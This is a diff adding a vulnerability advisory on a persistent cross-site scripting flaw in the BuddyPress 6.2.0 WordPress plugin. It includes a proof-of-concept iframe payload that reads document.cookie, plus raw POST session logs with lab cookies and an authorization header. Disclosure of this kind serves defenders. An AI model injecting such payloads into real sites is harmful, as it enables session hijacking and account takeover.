@@ -1,0 +1,292 @@
+# Exploit Title: WordPress Plugin Buddypress 6.2.0 - Persistent Cross-Site Scripting
+# Exploit Author: Vulnerability-Lab
+# Date: 2020-11-13
+# Vendor Homepage: https://wordpress.org/plugins/buddypress/
+# Version: 6.2.0
+
+Document Title:
+===============
+Buddypress v6.2.0 WP Plugin - Persistent Web Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2263
+
+
+Release Date:
+=============
+2020-11-13
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2263
+
+
+Common Vulnerability Scoring System:
+====================================
+4.2
+
+
+Vulnerability Class:
+====================
+Cross Site Scripting - Persistent
+
+
+Current Estimated Price:
+========================
+500€ - 1.000€
+
+
+Product & Service Introduction:
+===============================
+Are you looking for modern, robust, and sophisticated social network
+software? BuddyPress is a suite of components that are common
+to a typical social network, and allows for great add-on features
+through WordPress’s extensive plugin system. Aimed at site builders
+& developers, BuddyPress is focused on ease of integration, ease of use,
+and extensibility. It is deliberately powerful yet unbelievably
+simple social network software, built by contributors to WordPress.
+
+(Copy of the Homepage: https://wordpress.org/plugins/buddypress/ &
+https://buddypress.org/download/ )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered a persistent
+xss web vulnerability in the Buddypress v6.2.0 plugin for wordpress.
+
+
+Affected Product(s):
+====================
+Buddypress
+Product: Buddypress v6.0.0 - v6.2.0 (Wordpress Plugin)
+
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-11-13: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Authentication Type:
+====================
+Restricted Authentication (Moderator Privileges)
+
+
+User Interaction:
+=================
+No User Interaction
+
+
+Disclosure Type:
+================
+Independent Security Research
+
+
+Technical Details & Description:
+================================
+A persistent input validation web vulnerability has been discovered  in
+the Buddypress v6.0.0 - v6.2.0 plugin for wordpress.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise
+browser to web-application requests from the application-side.
+
+The persistent vulnerability is located in the `wp:html` name parameter
+of the `figure` content. Remote attackers with privileges
+are able to inject own malicious persistent script code as input to
+compromise the internal ui of the wordpress backend. The attacker
+injects his code and in case the admin or other privileged user account
+previews the content the code simple executes. The request method
+to inject is POST and the attack vector is located on the application-side.
+
+Successful exploitation of the vulnerabilities results in session
+hijacking, persistent phishing attacks, persistent external
+redirects to malicious source and persistent manipulation of affected
+application modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] wp:html
+
+Vulnerable Parameter(s):
+[+] figure
+
+Affected Module(s):
+[+] page_id=x&preview=true
+
+
+Proof of Concept (PoC):
+=======================
+The persistent web vulnerability can be exploited by remote attackers
+with privilged user accounts without user interaction.
+For security demonstration or to reproduce the vulnerability follow the
+provided information and steps below to continue.
+
+
+PoC: Inject
+https://test23.localhost:8000/wp-admin/post.php?post=6&action=edit
+
+
+PoC: Execute
+https://test23.localhost:8000/?page_id=6
+https://test23.localhost:8000/?page_id=6&preview=true
+
+
+PoC: Vulnerable Source
+<div id="content" class="site-content">
+<div class="wrap">
+<div id="primary" class="content-area">
+<main id="main" class="site-main" role="main">		
+<article id="post-6" class="post-6 page type-page status-draft hentry">
+<header class="entry-header">
+<h1 class="entry-title">Mitglieder</h1><span class="edit-link">
+<a class="post-edit-link"
+href="https://test23.localhost:8000/wp-admin/post.php?post=6&action=edit">
+<span class="screen-reader-text">„Mitglieder“</span>
+bearbeiten</a></span>	</header><!-- .entry-header -->
+<div class="entry-content">
+<p></p>
+<div class="wp-block-group"><div class="wp-block-group__inner-container">
+<div class="wp-block-group"><div
+class="wp-block-group__inner-container"></div></div>
+</div></div>
+<figure><iframe src="evil.source"
+onload="alert(document.cookie)"></iframe></figure>
+</div><!-- .entry-content -->
+</article><!-- #post-6 -->
+</main><!-- #main -->
+</div><!-- #primary -->
+</div><!-- .wrap -->
+</div>
+
+
+--- PoC Session Logs (POST) ---
+https://test23.localhost:8000/index.php?rest_route=%2Fwp%2Fv2%2Fpages%2F6&_locale=user
+Host: test23.localhost:8000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0)
+Gecko/20100101 Firefox/76.0
+Accept: application/json, */*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://test23.localhost:8000/wp-admin/post.php?post=6&action=edit
+X-WP-Nonce: 04a953e188
+X-HTTP-Method-Override: PUT
+Content-Type: application/json
+Origin: https://test23.localhost:8000
+Content-Length: 614
+Authorization: Basic dGVzdGVyMjM6Y2hhb3M2NjYhISE=
+Connection: keep-alive
+Cookie:
+g3sid=bdbf56f2335bbce0720f03ed25343b66db61b54a%7E6a5nrndvh14i5kb09tfrl7afe2;
+wordpress_test_cookie=WP+Cookie+check;
+wordpress_logged_in_55a3fb1cb724d159a111224c7f110400=admin_f507c7w4%7C1589912472%7CxTSn77nlwpdxYR8NUaJOXfQM9ShaBlSLzP7Anix
+xNt8%7C557ca2874863d9f1f6a8316659798e11558a01ffc8671eea68d496aa5df99b17;
+wp-settings-time-1=1589740723
+{"id":6,"content":"<!-- wp:paragraph -->n<p></p>n<!-- /wp:paragraph
+-->nn<!-- wp:group -->n<div class="wp-block-group">
+<div class="wp-block-group__inner-container"><!-- wp:group -->n<div
+class="wp-block-group"><div class="wp-block-group__inner-container">
+<!-- wp:block {"ref":"reusable1"} /--></div></div>n<!-- /wp:group
+--></div></div>n<!-- /wp:group -->nn
+<!-- wp:block {"ref":"reusable1"} /-->nn<!-- wp:block
+{"ref":"reusable1"} /-->nn
+<!-- wp:html -->n<figure><iframe src="evil.source"
+onload="alert(document.cookie)"></iframe></figure>n<!-- /wp:html
+-->nn<!-- wp:bp/member /-->"}
+-
+POST: HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate, max-age=0
+Allow: GET, POST, PUT, PATCH, DELETE
+Content-Type: application/json; charset=UTF-8
+Vary: Origin
+Server: Microsoft-IIS/8.5
+X-Robots-Tag: noindex
+Link: <https://test23.localhost:8000/index.php?rest_route=/>;
+rel="https://api.w.org/"
+Content-Length: 3108
+
+
+References:
+https://test23.localhost:8000/index.php
+https://test23.localhost:8000/wp-admin/post.php
+
+
+Security Risk:
+==============
+The security risk of the persistent input validation web vulnerability
+in the web-application is estimated as medium.
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab [Research Team] -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
+
+Any modified copy or reproduction, including partially usages, of this
+file requires authorization from Vulnerability Laboratory.
+Permission to electronically redistribute this alert in its unmodified
+form is granted. All other rights, including the use of other
+media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+All pictures, texts, advisories, source code, videos and other
+information on this website is trademark of vulnerability-lab team & the
+specific authors or managers. To record, list, modify, use or
+edit our material contact (admin@ or research@) to get a ask permission.
+
+				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
+Security GmbH]™
+
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
